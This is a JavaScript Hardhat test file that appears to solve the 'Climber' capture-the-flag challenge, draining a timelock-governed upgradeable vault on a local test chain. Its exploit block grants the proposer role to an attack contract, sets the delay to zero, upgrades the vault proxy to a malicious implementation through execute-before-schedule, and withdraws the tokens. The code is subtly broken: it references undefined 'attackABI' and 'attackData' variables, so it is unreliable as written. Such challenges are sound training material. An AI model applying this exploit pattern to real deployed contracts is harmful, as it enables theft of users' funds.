const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        const AttackVault = this.vault.connect(attacker);
        const AttackTimelock = this.timelock.connect(attacker);
        const AttackToken = this.token.connect(attacker);

        //deploy attacking contract
        const AttackContractFactory = await ethers.getContractFactory("AttackTimelock", attacker);
        const AttackContract = await AttackContractFactory.deploy(AttackVault.address, AttackToken.address, AttackTimelock.address);

        //deploy new logic contract for vault
        const MalciousVaultFactory = await ethers.getContractFactory("AttackVault", attacker);
        const maliciousVaultContract = await MalciousVaultFactory.deploy();

        const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));

        //helper function
        const createInterface = (signature, methodName, arguments) => {
            const ABI = signature;
            const IFace = new ethers.utils.Interface(ABI);
            const ABIData = IFace.encodeFunctionData(methodName, arguments);
            return ABIData;
        }

        //set attacker contract as proposer for timelock
        const setupRoleABI = ["function grantRole(bytes32 role, address account)"];
        const grantRoleData = createInterface(setupRoleABI, "grantRole", [PROPOSER_ROLE, AttackContract.address]);

        //update delay to 0
        const setupDelayABI = ["function updateDelay(uint64 newDelay)"];
        const updateDelayData = createInterface(setupDelayABI, "updateDelay", [0]);

        //update logic pointer to malicious vault contract
        const upgradeABI = ["function upgradeTo(address newImplementation)"];
        const upgradeData = createInterface(upgradeABI, "upgradeTo", [maliciousVaultContract.address]);

        //call attacking contract to schedule actions and sweep funds
        const scheduleABI = ["function schedule()"];
        const scheduleData = createInterface(attackABI, "schedule", undefined)

        const toAddress = [AttackTimelock.address, AttackTimelock.address, AttackVault.address, AttackContract.address];
        const data = [grantRoleData, updateDelayData, upgradeData, attackData];

        await AttackContract.setScheduleData(toAddress, data);

        await AttackTimelock.execute(toAddress, Array(data.length).fill(0), data, ethers.utils.hexZeroPad("0x00", 32));

        await AttackContract.withdraw();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
//set proposer
//set delay
//update proxy
//call exploit